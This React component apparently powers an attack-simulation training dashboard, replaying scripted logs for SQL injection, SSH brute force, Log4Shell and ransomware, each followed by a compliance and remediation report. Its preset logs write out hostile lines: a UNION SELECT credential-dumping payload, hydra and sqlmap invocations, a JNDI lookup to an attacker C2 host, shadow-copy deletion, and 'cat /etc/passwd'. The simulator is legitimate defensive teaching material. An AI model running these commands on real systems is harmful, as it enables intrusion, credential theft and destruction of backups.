import { useState, useEffect, useRef } from 'react';
import { SecurityEvent } from '../utils/aiEngine';
import { Terminal, Play, RefreshCw, Cpu, Layers, ShieldAlert, Loader2 } from 'lucide-react';
import { simulateAttackWithBackend } from '../utils/onlineEngine';

interface AttackSandboxProps {
  onTriggerAlert: (alert: SecurityEvent) => void;
}

interface AttackTemplate {
  name: string;
  type: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  signature: string;
  mitreCode: string;
  complianceFailure: string;
  sourceIp: string;
  destIp: string;
  protocol: 'TCP' | 'UDP' | 'HTTP' | 'SSH' | 'DNS' | 'ICMP';
  terminalLogs: string[];
  plainEnglishReport: {
    whatWasRun: string;
    whatItUncovered: string;
    complianceImpact: string;
    remediation: string;
  };
}

const ATTACK_TEMPLATES: AttackTemplate[] = [
  {
    name: 'Launch SQL Injection (SQLi) Probe',
    type: 'SQLi',
    description: 'Attempts to extract database columns using URL parameters containing UNION statements.',
    severity: 'high',
    signature: 'SQL Injection: UNION SELECT column query on GET /api/users/profile',
    mitreCode: 'T1190',
    complianceFailure: 'SOC 2 CC7.1 / OWASP Top 10 A03:2021',
    sourceIp: '192.168.1.142',
    destIp: '10.0.0.12',
    protocol: 'HTTP',
    terminalLogs: [
      '[sandbox@agent:~]$ python sqlmap.py -u "http://vulnerable-site.com/api/users/profile?id=1" --dbs',
      '[*] starting at 09:58:10',
      '[INFO] testing connection to the target URL',
      '[INFO] checking if the target is vulnerable to SQL injection',
      '[WARNING] heuristic test shows query string might be injectable',
      '[INFO] confirmation: executing UNION query injection vectors...',
      '>> PAYLOAD SENT: id=1 UNION SELECT null,username,password FROM users --',
      '[ALERT] AI engine detected SQL Injection signature in incoming GET request!',
      '[GRC WARNING] Control Breach detected on SOC 2 CC7.1 (Access Controls Audit Logs)'
    ],
    plainEnglishReport: {
      whatWasRun: 'An automated testing tool (SQLmap) simulated a hacker trying to inject database queries (UNION SELECT statements) inside the query parameter (?id=1) of a website user profile page.',
      whatItUncovered: 'A web server vulnerability where database queries are built insecurely. The application merged external inputs with internal database queries, allowing the client to execute database commands and retrieve customer usernames and password hashes.',
      complianceImpact: 'Breaches SOC 2 CC7.1 (Vulnerability Management & Monitoring) and secure coding standards. In production, this would lead to a severe GDPR personal data leak requiring immediate notification to privacy watchdogs.',
      remediation: 'Refactor database query codes to use Parameterized Queries (Prepared Statements). This forces the database to treat any user input as raw text rather than executable statements.'
    }
  },
  {
    name: 'Initiate SSH Brute Force Dictionary Scan',
    type: 'SSH',
    description: 'Simulates high-velocity automated login requests targeting administrative ports.',
    severity: 'medium',
    signature: 'SSH Brute Force: credential guessing attempts from invalid user profiles',
    mitreCode: 'T1110.001',
    complianceFailure: 'NIST CSF PR.AC-1 / ISO 27001 A.9.4.3',
    sourceIp: '185.220.101.4',
    destIp: '10.0.0.5',
    protocol: 'SSH',
    terminalLogs: [
      '[sandbox@agent:~]$ hydra -L users.txt -P passwords.txt ssh://10.0.0.5:22 -t 4',
      '[STATUS] attacking service ssh on port 22',
      '[TRY] user: admin, password: password123 - failed',
      '[TRY] user: root, password: admin - failed',
      '[TRY] user: administrator, password: testing - failed',
      '[TRY] user: support, password: root - failed',
      '[ALERT] AI anomaly engine triggered: SSH fail session frequency exceeds baseline threshold',
      '[GRC WARNING] Control Breach detected on ISO 27001 A.9.2.1 (User credential restrictions)'
    ],
    plainEnglishReport: {
      whatWasRun: 'An automated brute force program (Hydra) fired high-speed login attempts at the Secure Shell (SSH) port 22 using default administrative accounts like "admin" and "root".',
      whatItUncovered: 'A server admin port exposed directly to the internet with no rate-limiting or firewall bans. This allows hackers to guess passwords indefinitely until they succeed.',
      complianceImpact: 'Violates ISO 27001 Control A.9.4.3 (Password controls) and NIST CSF PR.AC-1. Grabbing administrative credentials permits remote command-line access over server systems.',
      remediation: 'Turn off standard password authentication for SSH and enforce cryptographic SSH Key authentication. Use services like Fail2ban to ban IPs after 3-5 failed login attempts.'
    }
  },
  {
    name: 'Execute Log4Shell (RCE) Exploit Payload',
    type: 'Log4Shell',
    description: 'Injects LDAP JNDI strings into client user-agent headers to trigger remote executions.',
    severity: 'critical',
    signature: 'Log4Shell RCE: JNDI lookup string detected inside HTTP User-Agent headers',
    mitreCode: 'T1210',
    complianceFailure: 'SOC 2 CC7.1 / ISO 27001 A.12.6.1',
    sourceIp: '198.51.100.22',
    destIp: '10.0.0.18',
    protocol: 'HTTP',
    terminalLogs: [
      '[sandbox@agent:~]$ curl -H "User-Agent: ${jndi:ldap://malicious-c2-server.ru:1389/a}" http://10.0.0.18:8080/index',
      '[INFO] request sent to Tomcat server environment',
      '[INFO] server logging query with Log4j Core engine...',
      '[PROCESS] resolving JNDI dynamic reference string',
      '[ALERT] AI engine intercepted remote JDNI lookup address malicious-c2-server.ru',
      '[SEVERE] vulnerability CVE-2021-44228 matched. Code injection blocked.',
      '[GRC WARNING] Control Failure matched: ISO 27001 A.12.6.1 (Technical Vulnerability Management)'
    ],
    plainEnglishReport: {
      whatWasRun: 'A web request (curl) containing a dynamic JNDI search command (${jndi:ldap://...}) was sent, hidden inside the web browser header field (User-Agent).',
      whatItUncovered: 'The server was using an unpatched, vulnerable version of the Apache Log4j log library. When logging incoming browser requests, it processed the lookup command and attempted to fetch and execute code from an external attacker server.',
      complianceImpact: 'Violates ISO 27001 Control A.12.6.1 (Technical Vulnerability Management) and SOC 2 CC7.1. Represents a critical Remote Code Execution vulnerability enabling complete server hijack.',
      remediation: 'Upgrade all Apache Log4j dependency packages to version 2.17.1 or higher. Set log4j2.formatMsgNoLookups=true to disable remote directory parsing.'
    }
  },
  {
    name: 'Deploy Locky Ransomware Agent Script',
    type: 'Ransomware',
    description: 'Fires shadow storage deletion events followed by simulated bulk file renames.',
    severity: 'critical',
    signature: 'Ransomware Execution: Shadow volume deletions followed by encrypted file renaming loops',
    mitreCode: 'T1486',
    complianceFailure: 'NIST CSF PR.IP-4 / SOC 2 CC8.1',
    sourceIp: '10.0.0.25',
    destIp: '10.0.0.40',
    protocol: 'TCP',
    terminalLogs: [
      '[sandbox@agent:~]$ powershell.exe -ExecutionPolicy Bypass -File encryptor.ps1',
      '[INFO] executing update.exe from user profile directories',
      '[EXEC] spawning vssadmin.exe to wipe local storage volumes...',
      '[CMD] vssadmin.exe Delete Shadows /All /Quiet',
      '[WRITE] modifying file extensions: Invoice.xlsx -> Invoice.xlsx.locked',
      '[WRITE] modifying file extensions: Employees.csv -> Employees.csv.locked',
      '[ALERT] AI Endpoint Protection Agent detected anomalous shadow storage modifications!',
      '[GRC WARNING] Integrity Failure: NIST CSF PR.IP-4 (Information Backup protection guidelines)'
    ],
    plainEnglishReport: {
      whatWasRun: 'A PowerShell script simulating Ransomware launched a tool (vssadmin.exe) to delete all automated local recovery snapshots, followed by renaming local files with a ".locked" suffix.',
      whatItUncovered: 'System settings permitted general processes to delete backup shadow copies and carry out rapid, bulk modifications on user documentation folders without getting stopped.',
      complianceImpact: 'Violates NIST CSF PR.IP-4 (Information Backup protection guidelines) and SOC 2 CC8.1. Deleting backups leaves the organization unable to recover files without paying the ransom.',
      remediation: 'Configure local system access control guidelines (EDR / Group Policy) to restrict backup management tools (vssadmin.exe) from being called by non-admin applications. Store server backups in an off-site, air-gapped environment.'
    }
  }
];

export default function AttackSandbox({ onTriggerAlert }: AttackSandboxProps) {
  const [consoleLogs, setConsoleLogs] = useState<string[]>(['[SYSTEM-SOC] Simulator sandbox active. Choose an attack payload...']);
  const [runningAttack, setRunningAttack] = useState<string | null>(null);
  const [completedReport, setCompletedReport] = useState<AttackTemplate | null>(null);
  const consoleContainerRef = useRef<HTMLDivElement>(null);
  
  // Custom Attack states
  const [editorMode, setEditorMode] = useState<'presets' | 'custom'>('presets');
  const [customName, setCustomName] = useState('Custom Intrusion Scan');
  const [customSeverity, setCustomSeverity] = useState<'low' | 'medium' | 'high' | 'critical'>('high');
  const [customProtocol, setCustomProtocol] = useState<'TCP' | 'UDP' | 'HTTP' | 'SSH' | 'DNS' | 'ICMP'>('TCP');
  const [customScript, setCustomScript] = useState(
    `# Custom exploit execution script
ping -c 4 127.0.0.1
nmap -sS -p 22,80,443 localhost
curl -X POST -d "user=admin&pass=root" http://localhost:3000/api/auth
cat /etc/passwd`
  );

  // Auto-scroll terminal container locally without shifting the window viewport
  useEffect(() => {
    if (consoleContainerRef.current) {
      consoleContainerRef.current.scrollTop = consoleContainerRef.current.scrollHeight;
    }
  }, [consoleLogs]);

  const handleLaunchAttack = (template: AttackTemplate) => {
    if (runningAttack) return;
    setCompletedReport(null);
    setRunningAttack(template.name);
    setConsoleLogs(prev => [...prev, '', `[ATTACK LAUNCH] Preparing to execute: ${template.name}`, '---------------------------------------']);

    let logIndex = 0;
    const interval = setInterval(() => {
      if (logIndex < template.terminalLogs.length) {
        const nextLog = template.terminalLogs[logIndex];
        setConsoleLogs(prev => [...prev, nextLog]);
        logIndex++;
      } else {
        clearInterval(interval);
        setRunningAttack(null);
        setConsoleLogs(prev => [...prev, '---------------------------------------', '[COMPLETE] Exploit script cycle completed.', '']);
        setCompletedReport(template);
        
        // Push alert block to main state
        const timeNow = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        onTriggerAlert({
          id: `ALT-${Math.floor(1000 + Math.random() * 9000)}`,
          timestamp: timeNow,
          sourceIp: template.sourceIp,
          destIp: template.destIp,
          protocol: template.protocol,
          severity: template.severity,
          signature: template.signature,
          mitreTechnique: template.mitreCode,
          complianceFailure: template.complianceFailure,
          status: 'active'
        });
      }
    }, 450);
  };

  const handleLaunchCustomAttack = async () => {
    if (runningAttack) return;
    
    // Split the custom script by newline and filter empty lines
    const lines = customScript.split('\n').map(line => line.trim()).filter(line => line.length > 0);
    const terminalLogs = lines.map(line => {
      if (line.startsWith('#')) {
        return `[INFO] ${line.substring(1).trim()}`;
      }
      return `[sandbox@agent:~]$ ${line}`;
    });
    
    terminalLogs.push(`[ALERT] AI Endpoint Protection Agent intercepted custom command sequence!`);
    terminalLogs.push(`[GRC WARNING] Compliance risk flag triggered: NIST CSF PR.IP-4 / SOC 2 CC7.1`);

    let plainEnglishReport: any;
    try {
      setRunningAttack(customName); // Briefly show running state while fetching
      plainEnglishReport = await simulateAttackWithBackend(customName, customProtocol, customScript);
    } catch (err) {
      console.error("Backend failed, falling back to mock", err);
      plainEnglishReport = {
        whatWasRun: `A custom security penetration script named "${customName}" was written and executed inside the sandboxed environment. The script executed commands utilizing the ${customProtocol} protocol.`,
        whatItUncovered: `The script ran the following command parameters in sequence:\n${lines.map(l => `  - \`${l}\``).join('\n')}\nThe terminal audited raw diagnostic logs and caught anomalous execution activity.`,
        complianceImpact: `Triggers compliance checks under NIST CSF guidelines and SOC 2 Trust Principles (Security & Monitoring) for unauthorized local shell command telemetry.`,
        remediation: `Restructure access control configurations to restrict non-administrative local accounts from spawning high-privilege shell terminals. Enforce strict logging controls on localhost terminal telemetry.`
      };
    }
    setRunningAttack(null); // Clear it before handleLaunchAttack takes over

    const customTemplate: AttackTemplate = {
      name: customName,
      type: 'Custom',
      description: 'User-defined penetration payload executing dynamically.',
      severity: customSeverity,
      signature: `Custom Attack: Command execution targeting ${customProtocol}`,
      mitreCode: 'T1059',
      complianceFailure: 'NIST CSF PR.IP-4 / SOC 2 CC7.1',
      sourceIp: '192.168.1.55',
      destIp: '127.0.0.1',
      protocol: customProtocol,
      terminalLogs,
      plainEnglishReport
    };

    handleLaunchAttack(customTemplate);
  };

  const handleClearTerminal = () => {
    setConsoleLogs(['[SYSTEM-SOC] Terminal terminal cleared. Ready for exploitation...']);
    setCompletedReport(null);
  };

  return (
    <div className="cyber-grid-container" style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', gap: '20px', padding: '20px' }}>
      
      {/* Simulation Command Cards */}
      <div className="cyber-panel" style={{ gridColumn: 'span 5', display: 'flex', flexDirection: 'column', gap: '15px' }}>
        <h3 className="tech-font" style={{ fontSize: '0.9rem', color: 'var(--neon-cyan)', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <Layers style={{ width: '16px', height: '16px' }} /> ATTACK SIMULATOR SUITE
        </h3>
        
        {/* Editor Mode Tabs */}
        <div style={{ display: 'flex', gap: '5px', background: '#050811', padding: '3px', borderRadius: '4px', border: '1px solid rgba(255,255,255,0.05)' }}>
          <button
            style={{
              flex: 1,
              padding: '6px',
              fontSize: '0.7rem',
              background: editorMode === 'presets' ? 'rgba(0, 240, 255, 0.1)' : 'none',
              border: 'none',
              color: editorMode === 'presets' ? '#00f2fe' : 'var(--text-muted)',
              cursor: 'pointer',
              fontWeight: 'bold',
              borderRadius: '3px',
              transition: 'all 0.3s'
            }}
            onClick={() => setEditorMode('presets')}
          >
            PRESET VECTORS
          </button>
          <button
            style={{
              flex: 1,
              padding: '6px',
              fontSize: '0.7rem',
              background: editorMode === 'custom' ? 'rgba(0, 240, 255, 0.1)' : 'none',
              border: 'none',
              color: editorMode === 'custom' ? '#00f2fe' : 'var(--text-muted)',
              cursor: 'pointer',
              fontWeight: 'bold',
              borderRadius: '3px',
              transition: 'all 0.3s'
            }}
            onClick={() => setEditorMode('custom')}
          >
            CUSTOM BUILDER
          </button>
        </div>

        {editorMode === 'presets' ? (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', flex: 1, overflowY: 'auto' }}>
            {ATTACK_TEMPLATES.map((item, index) => (
              <div 
                key={index}
                style={{ 
                  background: '#070b15', 
                  border: runningAttack === item.name ? '1px solid var(--neon-red)' : '1px solid rgba(0,240,255,0.08)',
                  padding: '12px', 
                  borderRadius: '4px',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '8px',
                  transition: 'all 0.3s'
                }}
              >
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <span className="tech-font" style={{ fontSize: '0.75rem', fontWeight: 'bold', color: '#fff' }}>
                    {item.name}
                  </span>
                  <span className={`cyber-badge ${
                    item.severity === 'critical' ? 'cyber-badge-red' :
                    item.severity === 'high' ? 'cyber-badge-orange' :
                    item.severity === 'medium' ? 'cyber-badge-cyan' :
                    'cyber-badge-green'
                  }`} style={{ fontSize: '0.6rem' }}>
                    {item.severity}
                  </span>
                </div>
                <p style={{ fontSize: '0.7rem', color: 'var(--text-muted)' }}>
                  {item.description}
                </p>
                
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '0.65rem', color: 'var(--text-muted)', borderTop: '1px solid rgba(255,255,255,0.03)', paddingTop: '8px', marginTop: '3px' }}>
                  <span>Impact: <strong style={{ color: 'var(--neon-orange)' }}>{item.mitreCode}</strong></span>
                  <span>Audit: <strong style={{ color: 'var(--neon-cyan)' }}>{item.complianceFailure.split(' / ')[0]}</strong></span>
                </div>

                <button 
                  className="cyber-btn cyber-btn-primary"
                  style={{ width: '100%', padding: '6px', fontSize: '0.7rem', marginTop: '5px' }}
                  onClick={() => handleLaunchAttack(item)}
                  disabled={!!runningAttack}
                >
                  <Play style={{ width: '12px', height: '12px' }} /> Launch Attack Vector
                </button>
              </div>
            ))}
          </div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', flex: 1 }}>
            <div style={{ display: 'flex', gap: '8px' }}>
              <div style={{ flex: 1 }}>
                <label style={{ fontSize: '0.65rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>Attack Vector Name:</label>
                <input 
                  className="cyber-input" 
                  style={{ fontSize: '0.75rem', padding: '6px', width: '100%' }}
                  value={customName}
                  onChange={(e) => setCustomName(e.target.value)}
                />
              </div>
              <div>
                <label style={{ fontSize: '0.65rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>Severity:</label>
                <select 
                  className="cyber-input" 
                  style={{ fontSize: '0.75rem', padding: '5px', background: '#070b15', border: '1px solid rgba(255,255,255,0.15)', color: '#fff', width: '80px', height: '28px' }}
                  value={customSeverity}
                  onChange={(e: any) => setCustomSeverity(e.target.value)}
                >
                  <option value="low">Low</option>
                  <option value="medium">Medium</option>
                  <option value="high">High</option>
                  <option value="critical">Critical</option>
                </select>
              </div>
            </div>

            <div style={{ display: 'flex', gap: '8px' }}>
              <div style={{ flex: 1 }}>
                <label style={{ fontSize: '0.65rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>Target Protocol:</label>
                <select 
                  className="cyber-input" 
                  style={{ fontSize: '0.75rem', padding: '5px', background: '#070b15', border: '1px solid rgba(255,255,255,0.15)', color: '#fff', width: '100%', height: '28px' }}
                  value={customProtocol}
                  onChange={(e: any) => setCustomProtocol(e.target.value)}
                >
                  <option value="TCP">TCP</option>
                  <option value="UDP">UDP</option>
                  <option value="HTTP">HTTP</option>
                  <option value="SSH">SSH</option>
                  <option value="DNS">DNS</option>
                  <option value="ICMP">ICMP</option>
                </select>
              </div>
            </div>

            <div style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
              <label style={{ fontSize: '0.65rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px' }}>Sandbox Script Commands (one command per line):</label>
              <textarea
                className="cyber-input mono-font"
                style={{ flex: 1, minHeight: '140px', fontSize: '0.7rem', resize: 'none', background: '#050811', border: '1px solid var(--panel-border)', lineHeight: '1.4', padding: '8px', color: '#38f9d7' }}
                value={customScript}
                onChange={(e) => setCustomScript(e.target.value)}
              />
            </div>

            <button 
              className="cyber-btn cyber-btn-primary"
              style={{ width: '100%', padding: '8px', fontSize: '0.75rem', marginTop: '5px' }}
              onClick={handleLaunchCustomAttack}
              disabled={!!runningAttack}
            >
              <Play style={{ width: '12px', height: '12px' }} /> Fire Custom Script Payload
            </button>
          </div>
        )}
      </div>

      {/* Interactive Terminal Panel */}
      <div className="cyber-panel" style={{ gridColumn: 'span 7', height: '520px', display: 'flex', flexDirection: 'column', background: '#03050b', border: '1px solid #00f0ff55' }}>
        
        {/* Terminal Window Header Bar */}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#080d19', padding: '10px 15px', borderBottom: '1px solid rgba(0, 240, 255, 0.15)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Terminal style={{ color: 'var(--neon-cyan)', width: '16px', height: '16px' }} />
            <span className="tech-font" style={{ fontSize: '0.75rem', fontWeight: 'bold', color: '#fff', letterSpacing: '1px' }}>
              SEC-OPS ATTACK INTERACTIVE CONSOLE
            </span>
          </div>
          <div style={{ display: 'flex', gap: '15px', alignItems: 'center' }}>
            <span className="pulse-dot-cyan" style={{ width: '6px', height: '6px' }}></span>
            <button 
              style={{ background: 'none', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '5px', fontSize: '0.65rem' }}
              onClick={handleClearTerminal}
            >
              <RefreshCw style={{ width: '10px', height: '10px' }} /> Clear
            </button>
          </div>
        </div>

        {/* Console output display */}
        <div 
          ref={consoleContainerRef}
          className="mono-font"
          style={{ 
            flex: 1, 
            padding: '15px', 
            overflowY: 'auto', 
            fontSize: '0.7rem', 
            color: 'var(--neon-cyan)', 
            lineHeight: '1.5',
            whiteSpace: 'pre-wrap',
            background: 'linear-gradient(180deg, #03050b 0%, #050811 100%)'
          }}
        >
          {consoleLogs.map((log, index) => {
            let color = 'var(--neon-cyan)';
            if (log.startsWith('[ATTACK')) color = 'var(--neon-orange)';
            else if (log.includes('[ALERT') || log.includes('[SEVERE')) color = 'var(--neon-red)';
            else if (log.includes('[GRC')) color = 'var(--neon-purple)';
            else if (log.includes('[TRY')) color = 'var(--text-muted)';
            else if (log.includes('>> PAYLOAD')) color = '#fff';

            return (
              <div key={index} style={{ color, marginBottom: '4px' }}>
                {log}
              </div>
            );
          })}
          
          {runningAttack && (
            <div style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', marginTop: '10px' }}>
              <Cpu style={{ animation: 'spin 1.5s linear infinite', width: '12px', height: '12px' }} />
              <span className="tech-font" style={{ fontSize: '0.65rem', animation: 'pulse-cyan 1s infinite' }}>SIMULATING THREAT EXECUTION...</span>
            </div>
          )}
        </div>
      </div>

      {completedReport && (
        <div className="cyber-panel fade-in" style={{ gridColumn: 'span 12', marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '18px', border: '1px solid rgba(255, 94, 98, 0.3)', background: 'rgba(18, 22, 47, 0.65)' }}>
          <h3 className="tech-font" style={{ fontSize: '1rem', color: 'var(--neon-red)', display: 'flex', alignItems: 'center', gap: '8px', margin: 0 }}>
            <ShieldAlert style={{ width: '18px', height: '18px' }} /> AI POST-INCIDENT FORENSIC REPORT (PLAIN ENGLISH)
          </h3>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(12, 1fr)', gap: '20px' }}>
            <div style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
              <div>
                <strong style={{ fontSize: '0.75rem', color: 'var(--neon-orange)', textTransform: 'uppercase', letterSpacing: '0.5px', display: 'block', marginBottom: '4px' }}>What was run:</strong>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                  {completedReport.plainEnglishReport.whatWasRun}
                </p>
              </div>
              <div>
                <strong style={{ fontSize: '0.75rem', color: 'var(--neon-cyan)', textTransform: 'uppercase', letterSpacing: '0.5px', display: 'block', marginBottom: '4px' }}>What it uncovered:</strong>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                  {completedReport.plainEnglishReport.whatItUncovered}
                </p>
              </div>
            </div>
            <div style={{ gridColumn: 'span 6', display: 'flex', flexDirection: 'column', gap: '14px' }}>
              <div>
                <strong style={{ fontSize: '0.75rem', color: 'var(--neon-purple)', textTransform: 'uppercase', letterSpacing: '0.5px', display: 'block', marginBottom: '4px' }}>GRC & Compliance Impact:</strong>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                  {completedReport.plainEnglishReport.complianceImpact}
                </p>
              </div>
              <div>
                <strong style={{ fontSize: '0.75rem', color: 'var(--neon-green)', textTransform: 'uppercase', letterSpacing: '0.5px', display: 'block', marginBottom: '4px' }}>Remediation Action Plan:</strong>
                <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                  {completedReport.plainEnglishReport.remediation}
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
